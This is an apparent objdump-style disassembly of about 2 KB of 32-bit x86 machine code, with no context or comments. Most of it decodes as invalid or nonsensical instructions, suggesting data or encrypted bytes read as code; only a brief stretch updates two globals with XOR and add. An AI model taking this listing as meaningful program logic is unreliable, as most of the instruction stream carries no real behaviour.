  4118c1:	cld    
  4118c2:	or     DWORD PTR [eax+0xa],edx
  4118c5:	dec    ecx
  4118c6:	xor    ch,BYTE PTR [edi+0x29fee812]
  4118cc:	xchg   ebx,eax
  4118cd:	dec    esp
  4118ce:	add    eax,0xd0915c42
  4118d3:	fwait
  4118d4:	and    bl,0x1e
  4118d7:	(bad)  
  4118d8:	sub    al,0x13
  4118da:	aam    0xd1
  4118dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118dd:	push   cs
  4118de:	cld    
  4118df:	ret    0x25c0
  4118e2:	push   ds
  4118e3:	outs   dx,BYTE PTR ds:[esi]
  4118e4:	inc    ebp
  4118e5:	gs xchg si,ax
  4118e8:	push   ds
  4118e9:	dec    esp
  4118ea:	in     eax,dx
  4118eb:	inc    esp
  4118ec:	adc    edi,esi
  4118ee:	xor    al,0xa0
  4118f0:	or     BYTE PTR [edi+0xc970900],ah
  4118f6:	call   0x1da0529e
  4118fb:	aad    0xc5
  4118fd:	sbb    eax,0xc0ec755a
  411902:	rol    dl,cl
  411904:	fmul   st,st(4)
  411906:	lds    edx,FWORD PTR [ebx+0x374af9d5]
  41190c:	push   cs
  41190d:	les    eax,FWORD PTR [ecx+0x3d5d42c7]
  411913:	xchg   BYTE PTR [ebp-0x3f],ah
  411916:	aad    0xfb
  411918:	xchg   esi,eax
  411919:	push   eax
  41191a:	(bad)  
  41191b:	push   esp
  41191c:	lds    esi,FWORD PTR [eax+ecx*8]
  41191f:	push   cs
  411920:	aam    0x23
  411922:	aam    0x2e
  411924:	sbb    DWORD PTR [ebp-0x4f],ebx
  411927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411928:	cwde   
  411929:	or     DWORD PTR ds:[esi+0x36c13bae],edx
  411930:	sbb    DWORD PTR [ebx-0x79],esi
  411933:	jae    0x4118e7
  411935:	jmp    edx
  411937:	(bad)  
  411939:	push   0x39
  41193b:	cdq    
  41193c:	rol    BYTE PTR [edx+0xbfbe525],cl
  411942:	pop    ebp
  411943:	test   BYTE PTR [eax-0x34],dh
  411946:	fsub   QWORD PTR [edi+0x6c6c74af]
  41194c:	xor    BYTE PTR ds:0xdfbf3a6b,dh
  411952:	cld    
  411953:	ficomp WORD PTR [edi+esi*8]
  411956:	arpl   WORD PTR [ebx],cx
  411958:	out    0x8b,al
  41195a:	jmp    0x7594:0x9bd3eede
  411961:	and    eax,0xec336db5
  411966:	jb     0x41193c
  411968:	add    esi,DWORD PTR [ebx-0x30bd954a]
  41196e:	loop   0x411954
  411970:	add    dh,BYTE PTR [eax+ebx*8-0x77]
  411974:	(bad)  
  411976:	push   esi
  411977:	in     al,dx
  411978:	outs   dx,DWORD PTR ds:[esi]
  411979:	dec    eax
  41197a:	aad    0xae
  41197c:	test   bh,cl
  41197e:	jp     0x41191e
  411980:	push   es
  411981:	lods   eax,DWORD PTR ds:[esi]
  411982:	push   es
  411983:	xor    eax,0x95a32cc7
  411988:	cmp    eax,0xf761c554
  41198d:	pop    es
  41198e:	js     0x411a09
  411990:	jno    0x4119cc
  411992:	jmp    FWORD PTR [ebx-0x7e864556]
  411998:	adc    eax,0xa38c29f6
  41199d:	inc    eax
  41199e:	retf   
  41199f:	xchg   ecx,eax
  4119a0:	lock jecxz 0x4119a2
  4119a3:	shl    DWORD PTR [edx],0x9e
  4119a6:	jp     0x41194c
  4119a8:	popf   
  4119a9:	mov    BYTE PTR [ecx+0x79],cl
  4119ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4119ad:	or     bl,BYTE PTR [ebp+0x3e]
  4119b0:	jmp    0x4843abed
  4119b5:	mov    ecx,eax
  4119b7:	rol    ebp,cl
  4119b9:	test   al,0xfd
  4119bb:	(bad)  
  4119bc:	(bad)  
  4119be:	sbb    eax,0xda410148
  4119c3:	mov    esi,0x9a9c2ea1
  4119c8:	fiadd  DWORD PTR [ecx-0x27]
  4119cb:	or     eax,0x9f640f28
  4119d0:	sbb    bh,BYTE PTR [edx-0x3e]
  4119d3:	cmc    
  4119d4:	mov    ecx,0x6a157690
  4119d9:	push   es
  4119da:	test   eax,0xee7214f1
  4119df:	and    DWORD PTR [esi-0x73],ebx
  4119e2:	repz clc 
  4119e4:	jb     0x41196d
  4119e6:	mov    ch,0x6f
  4119e8:	dec    edx
  4119e9:	or     dh,BYTE PTR [ebx-0x25]
  4119ec:	out    dx,eax
  4119ed:	xor    eax,0xfe220068
  4119f2:	cdq    
  4119f3:	xchg   edi,eax
  4119f4:	and    DWORD PTR [esi-0x496fd059],ebp
  4119fa:	fsub   st,st(4)
  4119fc:	imul   BYTE PTR [ebx+0x23]
  4119ff:	cdq    
  411a00:	push   ss
  411a01:	or     esi,esi
  411a03:	neg    BYTE PTR [esi+0x31]
  411a06:	mov    bh,0xae
  411a08:	pop    es
  411a09:	push   eax
  411a0a:	div    DWORD PTR [ebp+0x74]
  411a0d:	ss jbe 0x4119be
  411a10:	mov    dh,0xa
  411a12:	xlat   BYTE PTR ds:[ebx]
  411a13:	cmp    ax,0x6366
  411a17:	mov    dh,0xe9
  411a19:	test   eax,0xa5494698
  411a1e:	jb     0x4119ae
  411a20:	push   0xffffffff
  411a22:	xor    eax,0xb6b88f55
  411a27:	adc    eax,0x20343187
  411a2c:	xchg   DWORD PTR [eax-0x9],esp
  411a2f:	jmp    0x411a55
  411a31:	cs in  al,0x31
  411a34:	mov    eax,DWORD PTR ds:0xbda5b26e
  411a3a:	mov    dl,0xd0
  411a3c:	outs   dx,DWORD PTR ds:[esi]
  411a3d:	neg    DWORD PTR [ebp+0xf]
  411a40:	outs   dx,DWORD PTR ds:[esi]
  411a41:	sub    esp,0xffffffbb
  411a44:	loopne 0x411a23
  411a46:	xchg   BYTE PTR [ebp+0x2bfe6878],cl
  411a4c:	mov    esi,0xdddfb276
  411a51:	pop    esi
  411a52:	push   esp
  411a53:	push   ebp
  411a54:	aas    
  411a55:	xor    BYTE PTR [ebx-0x60],0x5d
  411a59:	push   cs
  411a5a:	push   ebp
  411a5b:	jmp    0x2153a705
  411a60:	mov    esp,0x82a7f8e5
  411a65:	inc    esp
  411a66:	jp     0x4119ff
  411a68:	neg    BYTE PTR [esi]
  411a6a:	jb     0x411aa7
  411a6c:	scas   al,BYTE PTR es:[edi]
  411a6d:	stc    
  411a6e:	or     ch,al
  411a70:	sbb    BYTE PTR [ecx-0x569b849f],0x1b
  411a77:	aam    0x8
  411a79:	and    BYTE PTR [ecx],bh
  411a7b:	mov    ebp,0x8c76a513
  411a80:	lock aas 
  411a82:	dec    esi
  411a83:	popf   
  411a84:	pop    ecx
  411a85:	pusha  
  411a86:	loopne 0x411a2f
  411a88:	neg    BYTE PTR [edx]
  411a8a:	dec    edi
  411a8b:	imul   ebp,DWORD PTR [edi+edi*2+0x27],0x6b
  411a90:	sub    ebp,ecx
  411a92:	mov    ebp,0x9db89fda
  411a97:	fnsave [esi]
  411a99:	pop    eax
  411a9a:	push   esi
  411a9b:	out    dx,al
  411a9c:	rcl    cl,cl
  411a9e:	pop    ebp
  411a9f:	aaa    
  411aa0:	aad    0x50
  411aa2:	add    esp,DWORD PTR [edx]
  411aa4:	fisub  DWORD PTR [ebx-0x76e0b75a]
  411aaa:	in     al,0x4b
  411aac:	dec    ebx
  411aad:	sar    BYTE PTR [ebx-0x63c5fbfa],cl
  411ab3:	das    
  411ab4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ab5:	xchg   BYTE PTR [eax+ecx*2],al
  411ab8:	add    eax,0x1a6deaff
  411abd:	shr    BYTE PTR [eax-0x6f8285bb],1
  411ac3:	mov    DWORD PTR [eax+0x7d65d63e],0x462aae16
  411acd:	shl    ebx,cl
  411acf:	call   0x579f:0x5dd34e9b
  411ad6:	rcl    BYTE PTR [edx],cl
  411ad8:	pushf  
  411ad9:	cmp    eax,0xf2c64676
  411ade:	iret   
  411adf:	sti    
  411ae0:	in     al,dx
  411ae1:	jnp    0x411b02
  411ae3:	and    al,0x35
  411ae5:	and    al,0xab
  411ae7:	or     DWORD PTR [esp+edi*8+0x615b936f],esp
  411aee:	mov    ch,0x95
  411af0:	iret   
  411af1:	daa    
  411af2:	xchg   ecx,eax
  411af3:	sbb    DWORD PTR [esi],0x6fff1418
  411af9:	repz pusha 
  411afb:	(bad)  
  411afd:	mov    edi,DWORD PTR fs:[esi]
  411b00:	lock cmp dh,ah
  411b03:	stc    
  411b04:	aas    
  411b05:	shl    esi,1
  411b07:	sbb    esp,DWORD PTR [edx]
  411b09:	jecxz  0x411a8e
  411b0b:	add    ch,BYTE PTR [eax+0x1f]
  411b0e:	mov    esp,DWORD PTR [ebx-0x3c01cbb0]
  411b14:	pop    ecx
  411b15:	sub    eax,0xfbf6b02f
  411b1a:	mov    al,0x32
  411b1c:	add    al,0x46
  411b1e:	mov    fs,edi
  411b20:	fcmovnu st,st(7)
  411b22:	mov    edx,0x1d0214a8
  411b27:	repz call 0x1b4cb42f
  411b2d:	icebp  
  411b2e:	cmp    eax,0x1bab2e57
  411b33:	mov    al,0xdb
  411b35:	outs   dx,DWORD PTR cs:[esi]
  411b37:	sub    bh,BYTE PTR [eax]
  411b39:	ins    WORD PTR es:[edi],dx
  411b3b:	add    al,BYTE PTR [esi+0x22a6e56c]
  411b41:	js     0x411ae1
  411b43:	sub    eax,0xe109ad39
  411b48:	ss js  0x411b7c
  411b4b:	test   eax,0xa5dfece5
  411b50:	out    dx,al
  411b51:	fild   DWORD PTR [esi]
  411b53:	iret   
  411b54:	adc    esi,DWORD PTR [ebp+0x37]
  411b57:	or     BYTE PTR [ebp+0x41],0x5b
  411b5b:	jecxz  0x411b28
  411b5d:	pop    ss
  411b5e:	cmp    ebp,esi
  411b60:	in     eax,0xc2
  411b62:	das    
  411b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b64:	pop    ebx
  411b65:	lahf   
  411b66:	(bad)
  411b69:	stc    
  411b6a:	mov    dh,0x61
  411b6c:	fcomp  QWORD PTR [ecx+0x26]
  411b6f:	push   ds
  411b70:	fsubr  QWORD PTR [ebp-0x3e]
  411b73:	xor    DWORD PTR [ebx],0x1
  411b76:	mov    esp,0x2a222a88
  411b7b:	sub    esi,DWORD PTR ds:0x29785fa
  411b81:	pop    esi
  411b82:	jl     0x411b0f
  411b84:	into   
  411b85:	lock in al,0x36
  411b88:	out    0x8c,al
  411b8a:	iret   
  411b8b:	lods   eax,DWORD PTR ds:[esi]
  411b8c:	ins    DWORD PTR es:[edi],dx
  411b8d:	(bad)  
  411b8f:	nop
  411b90:	or     BYTE PTR [ebx-0x4a],al
  411b93:	sbb    eax,0x79c43001
  411b98:	push   ebx
  411b99:	pop    es
  411b9a:	and    al,0x77
  411b9c:	cmp    al,0x7c
  411b9e:	lods   al,BYTE PTR ds:[esi]
  411b9f:	mov    BYTE PTR ss:[ecx-0x6eb56b24],cl
  411ba6:	clc    
  411ba7:	in     eax,dx
  411ba8:	push   ecx
  411ba9:	pusha  
  411baa:	cmp    eax,0xbd7e4d47
  411baf:	in     al,dx
  411bb0:	add    eax,0xf3f4f5c8
  411bb5:	lock cmp esi,esi
  411bb8:	int3   
  411bb9:	pusha  
  411bba:	scas   eax,DWORD PTR es:[edi]
  411bbb:	inc    ecx
  411bbc:	cmp    DWORD PTR [ebp+0x99562d4],eax
  411bc2:	sub    BYTE PTR [ebx+0x65e244e1],cl
  411bc8:	adc    eax,0xd4b51fb3
  411bcd:	icebp  
  411bce:	jne    0x411c1b
  411bd0:	sub    al,0x70
  411bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd3:	sub    cl,BYTE PTR [ebx-0x1f8f6631]
  411bd9:	mov    ebx,0x43d6c35e
  411bde:	in     al,0x8a
  411be0:	pop    eax
  411be1:	popf   
  411be2:	adc    eax,0xdc23138c
  411be7:	mov    ?,WORD PTR [ecx]
  411be9:	xchg   ebx,eax
  411bea:	push   eax
  411beb:	xchg   ebx,eax
  411bec:	pop    esi
  411bed:	dec    esi
  411bee:	adc    BYTE PTR ds:0xb437357a,ah
  411bf4:	cmc    
  411bf5:	div    BYTE PTR [edi+0x54]
  411bf8:	xchg   edx,eax
  411bf9:	out    0x3c,eax
  411bfb:	test   DWORD PTR [eax+0x4e23a819],eax
  411c01:	nop
  411c02:	les    esi,FWORD PTR [edi-0x34d98306]
  411c08:	in     eax,0x4c
  411c0a:	mov    BYTE PTR [edi+0x34],ch
  411c0d:	or     DWORD PTR [esi+0x59],esi
  411c10:	jle    0x411baa
  411c12:	icebp  
  411c13:	adc    DWORD PTR [eax+0xd],ebx
  411c16:	in     eax,0xbf
  411c18:	mov    ch,0xbe
  411c1a:	sbb    al,ah
  411c1c:	stos   BYTE PTR es:[edi],al
  411c1d:	add    eax,0x3e52d665
  411c22:	jmp    0x411c86
  411c24:	jns    0x411c0d
  411c26:	clc    
  411c27:	push   ss
  411c28:	fadd   QWORD PTR [ebp-0x29]
  411c2b:	pop    ds
  411c2c:	(bad)  
  411c2e:	dec    esi
  411c2f:	sub    bh,dh
  411c31:	sub    cl,BYTE PTR [ebp+0x716961e0]
  411c37:	aad    0x59
  411c39:	sbb    BYTE PTR ds:0x37779489,dh
  411c3f:	jns    0x411c5c
  411c41:	jo     0x411c86
  411c43:	in     eax,dx
  411c44:	fstp   QWORD PTR [ebx]
  411c46:	cli    
  411c47:	arpl   WORD PTR [ecx+edi*1],ax
  411c4a:	(bad)  
  411c4b:	in     al,0xc8
  411c4d:	pusha  
  411c4e:	hlt    
  411c4f:	jo     0x411c82
  411c51:	push   ds
  411c52:	lods   al,BYTE PTR ds:[esi]
  411c53:	cdq    
  411c54:	pop    ebp
  411c55:	(bad)  
  411c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c57:	ds jmp 0xdd5454d5
  411c5d:	inc    ecx
  411c5e:	scas   eax,DWORD PTR es:[edi]
  411c5f:	add    al,0xd0
  411c61:	mov    eax,ds:0x1bbb8251
  411c66:	je     0x411c09
  411c68:	rol    BYTE PTR [edx+eiz*1+0x2ca1eee0],0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0x5289185e
  411cb8:	test   eax,0x7070535e
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c89
  411cc2:	xchg   ecx,eax
  411cc3:	jle    0x411ce5
  411cc5:	xor    eax,0x2cb483c4
  411cca:	lahf   
  411ccb:	mov    ecx,0xa0a47840
  411cd0:	retf   
  411cd1:	jb     0x411d46
  411cd3:	stos   BYTE PTR es:[edi],al
  411cd4:	daa    
  411cd5:	shl    DWORD PTR [ebp+0x5a859adc],0x1d
  411cdc:	ins    BYTE PTR es:[edi],dx
  411cdd:	lahf   
  411cde:	jmp    0xc831af87
  411ce3:	xchg   eax,edi
  411ce5:	ror    BYTE PTR [edx+ebx*2],cl
  411ce8:	mov    esp,0xd22cba0
  411ced:	ss or  dl,dl
  411cf0:	(bad)  
  411cf1:	cmp    DWORD PTR [ebx+0x20199f7e],edx
  411cf7:	in     al,dx
  411cf8:	xor    eax,0xc38498c1
  411cfd:	mov    BYTE PTR [eax],bl
  411cff:	cmc    
  411d00:	mov    dh,0x8f
  411d02:	idiv   al
  411d04:	sub    DWORD PTR [esi-0x2c7f9a9c],0x202c669
  411d0e:	test   eax,0x723d7177
  411d13:	jmp    0x411cd3
  411d15:	inc    ecx
  411d16:	idiv   DWORD PTR [edx-0x2a]
  411d19:	das    
  411d1a:	not    BYTE PTR [edi+0x3]
  411d1d:	sub    bh,BYTE PTR [eax+0x7dd5fd2a]
  411d23:	adc    DWORD PTR [edi],eax
  411d25:	lods   al,BYTE PTR ds:[esi]
  411d26:	lock popf 
  411d28:	(bad)  
  411d2a:	push   edx
  411d2b:	je     0x411d00
  411d2d:	and    BYTE PTR [di-0x18],0x43
  411d32:	dec    esp
  411d33:	aas    
  411d34:	pop    esi
  411d35:	cmp    BYTE PTR [eax+edi*4-0x6c3a0b55],bl
  411d3c:	cld    
  411d3d:	pop    eax
  411d3e:	mov    al,ds:0x52aa3986
  411d43:	das    
  411d44:	jo     0x411d3a
  411d46:	add    edi,DWORD PTR [eax]
  411d48:	mov    ebx,0x58fa2125
  411d4d:	aaa    
  411d4e:	sub    edi,DWORD PTR [ebx+0x6a7315a]
  411d54:	jg     0x411da6
  411d56:	rol    DWORD PTR [ebx-0x71],0x93
  411d5a:	adc    eax,0x67a920f7
  411d5f:	int3   
  411d60:	push   0x7d
  411d62:	pop    ebx
  411d63:	in     eax,dx
  411d64:	and    DWORD PTR [ebp+0x58aabf7b],ebx
  411d6a:	jmp    0xede5:0xeaaf46db
  411d71:	jg     0x411dc5
  411d73:	test   eax,0x8d7049f5
  411d78:	jecxz  0x411d2f
  411d7a:	iret   
  411d7b:	js     0x411d66
  411d7d:	mov    al,0x92
  411d7f:	popf   
  411d80:	in     eax,0xa1
  411d82:	addr16 inc edx
  411d84:	xchg   DWORD PTR ds:0x5e6c49fb,ebx
  411d8a:	push   ebp
  411d8b:	fisubr WORD PTR [eax]
  411d8d:	xor    eax,0x65ca3538
  411d92:	(bad)  
  411d93:	xchg   ebx,eax
  411d94:	push   esi
  411d95:	mov    eax,0x44fbbf54
  411d9a:	xchg   DWORD PTR [edi],esp
  411d9c:	lods   eax,DWORD PTR ds:[esi]
  411d9d:	(bad)  
  411d9e:	and    al,0xbe
  411da0:	push   0x78
  411da2:	xchg   ebx,eax
  411da3:	icebp  
  411da4:	jo     0x411d68
  411da6:	lock jo 0x411dbd
  411da9:	retf   0x6cdc
  411dac:	imul   ecx,DWORD PTR [ebx-0x48b86f89],0xfffffffa
  411db3:	or     BYTE PTR [esi],ah
  411db5:	push   ebx
  411db6:	lahf   
  411db7:	ror    ch,1
  411db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dba:	rol    cl,cl
  411dbc:	sub    BYTE PTR [esi-0x7c],ah
  411dbf:	sub    BYTE PTR [edi-0x2ea7f540],cl
  411dc5:	pushf  
  411dc6:	lahf   
  411dc7:	fisttp WORD PTR [esi]
  411dc9:	mov    ch,0x11
  411dcb:	pop    edx
  411dcc:	ins    BYTE PTR es:[edi],dx
  411dcd:	int    0x17
  411dcf:	jmp    0x9e49ddc8
  411dd4:	icebp  
  411dd5:	cmp    BYTE PTR [ecx-0x39116990],bl
  411ddb:	into   
  411ddc:	or     DWORD PTR [edi-0x75],edi
  411ddf:	aas    
  411de0:	push   0x942ebb5d
  411de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411de6:	aad    0xae
  411de8:	shl    DWORD PTR [ebx-0x3b],0x30
  411dec:	ja     0x411dab
  411dee:	xchg   ecx,eax
  411def:	or     al,dl
  411df1:	and    eax,0xfeb41b8a
  411df6:	aas    
  411df7:	fnsetpm(287 only) 
  411df9:	push   eax
  411dfa:	adc    BYTE PTR [edi-0x1a],bh
  411dfd:	dec    ecx
  411dfe:	push   es
  411dff:	jge    0x411e42
  411e01:	jg     0x411e68
  411e03:	dec    edi
  411e04:	and    ch,cl
  411e06:	dec    ebp
  411e07:	stc    
  411e08:	pop    esi
  411e09:	push   0x69
  411e0b:	cwde   
  411e0c:	mov    dh,0x89
  411e0e:	adc    eax,0x452b51a
  411e13:	fsub   QWORD PTR [ebx]
  411e15:	xchg   esi,eax
  411e16:	aad    0x21
  411e18:	mov    dh,dh
  411e1a:	push   cs
  411e1b:	outs   dx,BYTE PTR ds:[esi]
  411e1c:	cmp    DWORD PTR [esi],ebx
  411e1e:	out    dx,eax
  411e1f:	stos   BYTE PTR es:[edi],al
  411e20:	popa   
  411e21:	or     DWORD PTR [edx],edx
  411e23:	sbb    edx,DWORD PTR [edx-0x47395165]
  411e29:	and    al,0xa0
  411e2b:	(bad)  
  411e2c:	and    BYTE PTR [eax],cl
  411e2e:	inc    ebx
  411e2f:	sub    BYTE PTR [edi+edx*4-0x296981b0],bh
  411e36:	mov    WORD PTR [edi+ebp*1],fs
  411e39:	dec    esp
  411e3a:	xchg   ecx,eax
  411e3b:	pop    ds
  411e3c:	xchg   esp,eax
  411e3d:	and    eax,0xca25f763
  411e42:	ds stc 
  411e44:	mov    bh,0x8b
  411e46:	cmp    bh,BYTE PTR [edi-0x59]
  411e49:	jae    0x411e9a
  411e4b:	out    dx,eax
  411e4c:	pop    ebx
  411e4d:	mov    dl,0x12
  411e4f:	mov    ebx,0x3b093683
  411e54:	xor    ebx,DWORD PTR [ebp-0x63]
  411e57:	jbe    0x411e86
  411e59:	pop    ebx
  411e5a:	mov    ds:0xcb54067c,eax
  411e5f:	cmc    
  411e60:	cmp    dl,0x1
  411e63:	push   eax
  411e64:	scas   al,BYTE PTR es:[edi]
  411e65:	cmp    BYTE PTR [esi-0x7f],dl
  411e68:	xchg   esp,eax
  411e69:	and    al,0xd4
  411e6b:	mov    ds:0x99ce29d4,eax
  411e70:	xor    edi,eax
  411e72:	mov    ah,0xaf
  411e74:	push   esp
  411e75:	mov    BYTE PTR [ebx],ah
  411e77:	and    bh,cl
  411e79:	aam    0xd8
  411e7b:	pusha  
  411e7c:	jecxz  0x411e26
  411e7e:	aas    
  411e7f:	repnz fldenv [ecx-0x2bf3b291]
  411e86:	mov    edx,0xd368a30c
  411e8b:	xlat   BYTE PTR ds:[ebx]
  411e8c:	div    ecx
  411e8e:	xor    al,0x6a
  411e90:	xchg   esp,eax
  411e91:	cmp    al,BYTE PTR [eax]
  411e93:	add    esi,DWORD PTR [eax]
  411e95:	mov    ebx,DWORD PTR [edi-0x3261086e]
  411e9b:	or     eax,0xab06e71c
  411ea0:	test   BYTE PTR [esi+0x14],ah
  411ea3:	scas   al,BYTE PTR es:[edi]
  411ea4:	stos   DWORD PTR es:[edi],eax
  411ea5:	not    DWORD PTR [ecx-0x5]
  411ea8:	push   esi
  411ea9:	cmp    edx,DWORD PTR [esi]
  411eab:	ja     0x411eb2
  411ead:	push   edx
  411eae:	pop    esp
  411eaf:	ret    
  411eb0:	push   DWORD PTR [ecx]
  411eb2:	push   ecx
  411eb3:	out    0x0,eax
  411eb5:	push   esp
  411eb6:	add    DWORD PTR [ebx],0x2
  411eb9:	push   esp
  411eba:	ss or  eax,0x3c1bd1e3
  411ec0:	and    DWORD PTR [ecx+0x226d94b5],0xa6ee3fa3
  411eca:	ss ss jl 0x411f38
  411ece:	shld   edi,ecx,0x62
  411ed2:	cmp    BYTE PTR [esi],ch
  411ed4:	mov    DWORD PTR [edx-0x3637ab1c],edi
  411eda:	mov    edx,0xd1634d5f
  411edf:	cmp    eax,0xdcb98262
  411ee4:	mov    eax,0x87e81802
  411ee9:	jns    0x411eb2
  411eeb:	ret    
  411eec:	(bad)
  411eef:	int3   
  411ef0:	cli    
  411ef1:	sub    bh,dl
  411ef3:	or     BYTE PTR [eax],dh
  411ef5:	(bad)
  411ef8:	aas    
  411ef9:	jnp    0x411f3c
  411efb:	fild   DWORD PTR [edi]
  411efd:	mov    dh,0x79
  411eff:	dec    esp
  411f00:	mov    fs,WORD PTR [ebp-0x29]
  411f03:	mov    al,0x26
  411f05:	and    eax,0x9512695d
  411f0a:	mov    ecx,0xad1a2658
  411f0f:	xor    eax,0x8ad663c7
  411f14:	push   ds
  411f15:	xchg   edi,eax
  411f16:	xor    eax,0x7c23065c
  411f1b:	push   esi
  411f1c:	jge    0x411f17
  411f1e:	out    0xbb,eax
  411f20:	adc    eax,0x385eed03
  411f25:	arpl   WORD PTR [ecx],bx
  411f27:	or     al,0xbd
  411f29:	jns    0x411f5f
  411f2b:	xchg   ebp,eax
  411f2c:	and    eax,0x5c9aeea
  411f31:	retf   0xdcb5
  411f34:	(bad)  
  411f35:	orps   xmm3,XMMWORD PTR [edx]
  411f38:	icebp  
  411f39:	clc    
  411f3a:	jge    0x411f91
  411f3c:	cdq    
  411f3d:	retf   
  411f3e:	push   ds
  411f3f:	test   eax,0x4b54ae0e
  411f44:	test   eax,0x45e25228
  411f49:	push   0x3c
  411f4b:	xor    BYTE PTR [ebx+0x5bd045cc],bl
  411f51:	dec    ebx
  411f52:	mov    bh,0xac
  411f54:	pop    eax
  411f55:	adc    cl,bl
  411f57:	push   0xffffff81
  411f59:	add    DWORD PTR [edx],ebx
  411f5b:	rcr    BYTE PTR [edi-0x5b520482],0x17
  411f62:	xor    DWORD PTR [edx+0x3b],eax
  411f65:	(bad)  
  411f66:	dec    edx
  411f67:	jae    0x411f3c
  411f69:	add    eax,0x951029b0
  411f6e:	push   ebx
  411f6f:	aas    
  411f70:	cmp    DWORD PTR [ecx+0x7937fc77],ebx
  411f76:	or     eax,0x61b80e33
  411f7b:	adc    bh,dh
  411f7d:	jnp    0x411f88
  411f7f:	or     eax,0xdf097b1b
  411f84:	out    0x90,eax
  411f86:	sub    DWORD PTR [edx+0x48],0x371ed780
  411f8d:	ins    DWORD PTR es:[edi],dx
  411f8e:	sub    ecx,edi
  411f90:	inc    edi
  411f91:	bound  edi,QWORD PTR [edx+0xe]
  411f94:	test   BYTE PTR [esi+ecx*1+0xd4d78c],dl
  411f9b:	push   eax
  411f9c:	js     0x411f82
  411f9e:	and    eax,0x9ed4e932
  411fa4:	dec    esp
  411fa5:	inc    ax
  411fa7:	xchg   ebp,eax
  411fa8:	jno    0x411fa7
  411faa:	bswap  ecx
  411fac:	mov    bl,0x33
  411fae:	mov    ebp,0xcaef5afd
  411fb3:	in     eax,dx
  411fb4:	loopne 0x411f74
  411fb6:	and    eax,DWORD PTR [esp+ebp*4-0x58]
  411fba:	adc    al,0x75
  411fbc:	test   eax,0xbc78835c
  411fc1:	into   
  411fc2:	cmc    
  411fc3:	push   edx
  411fc4:	pop    es
  411fc5:	adc    al,ah
  411fc7:	adc    al,0x9d
  411fc9:	jo     0x412033
  411fcb:	mov    eax,0xb5442681
  411fd0:	mov    esp,0x6eec73c3
  411fd5:	test   esi,edx
  411fd7:	btr    edx,esi
  411fda:	mov    dl,0x8e
  411fdc:	add    BYTE PTR [edx+0x7f5e5013],al
  411fe2:	pushf  
  411fe3:	scas   al,BYTE PTR es:[edi]
  411fe4:	or     al,0xb2
  411fe6:	in     al,0x40
  411fe8:	ja     0x412044
  411fea:	mov    esp,0xe07ce72b
  411fef:	ja     0x411fe7
  411ff1:	cmp    al,0x26
  411ff3:	pop    esp
  411ff4:	adc    eax,0x96f331c3
  411ff9:	sub    esi,DWORD PTR [edx]
  411ffb:	stos   BYTE PTR es:[edi],al
  411ffc:	aam    0xc3
  411ffe:	inc    edi
  411fff:	in     al,0x1d
  412001:	or     BYTE PTR ds:[ecx+0x4a296310],cl
  412008:	ins    BYTE PTR es:[edi],dx
  412009:	lahf   
  41200a:	retf   0xdadc
  41200d:	and    al,0x60
  41200f:	jmp    0x411fbe
  412011:	xor    DWORD PTR [ecx],0xffffffbd
  412014:	jge    0x411fdf
  412016:	sbb    eax,eax
  412018:	jns    0x412043
  41201a:	mov    ds:0x98f412e4,eax
  41201f:	cmp    BYTE PTR [ebx],dh
  412021:	sbb    al,dl
  412023:	popa   
  412024:	inc    ebx
  412025:	nop
  412026:	push   esi
  412027:	out    dx,al
  412028:	push   ebx
  412029:	ret    0xaa81
  41202c:	daa    
  41202d:	jns    0x412086
  41202f:	adc    ah,bl
  412031:	ins    BYTE PTR es:[edi],dx
  412032:	inc    ebx
  412033:	jecxz  0x411fdf
  412035:	cmp    esi,DWORD PTR [esp+ebx*8+0x2c]
  412039:	adc    eax,0x85a9a419
  41203e:	iret   
  41203f:	lods   eax,DWORD PTR ds:[esi]
  412040:	aaa    
  412041:	xchg   BYTE PTR [eax],dh
  412043:	stos   BYTE PTR es:[edi],al
  412044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412045:	mov    bl,0x7a
  412047:	push   edi
  412048:	iret   
  412049:	shl    DWORD PTR [edx-0x7f],1
  41204c:	jbe    0x4120b5
  41204e:	mov    BYTE PTR ds:0x56b9f861,bl
  412054:	push   ds
  412055:	das    
  412056:	mov    edx,0x4ccb0fdc
  41205b:	ins    DWORD PTR es:[edi],dx
  41205c:	adc    BYTE PTR [ecx+0x79],cl
  41205f:	push   edx
  412060:	leave  
  412061:	xor    cl,BYTE PTR [ebp-0x14]
  412064:	test   eax,0xa22fd528
  412069:	cmp    DWORD PTR [ebx],0x50134331
  41206f:	rcl    ah,1
  412071:	rol    BYTE PTR [ebx+0x4e],0xbd
  412075:	in     eax,0xf
  412077:	fadd   DWORD PTR [ebx+edi*2]
  41207a:	popf   
  41207b:	mov    eax,ds:0xb60822ba
  412080:	sbb    eax,0xa3c50db
  412085:	into   
  412086:	fdiv   st(5),st
  412088:	pop    ebp
  412089:	pop    esi
  41208a:	gs mov ah,0xc0
  41208d:	cs (bad) 
  41208f:	cmp    eax,0xc7f73147
  412094:	dec    ebp
  412095:	mov    esi,0xa7f16c01
  41209a:	mov    cl,0x33
  41209c:	out    dx,eax
  41209d:	adc    al,bl
  41209f:	ins    BYTE PTR es:[edi],dx
  4120a0:	popf   
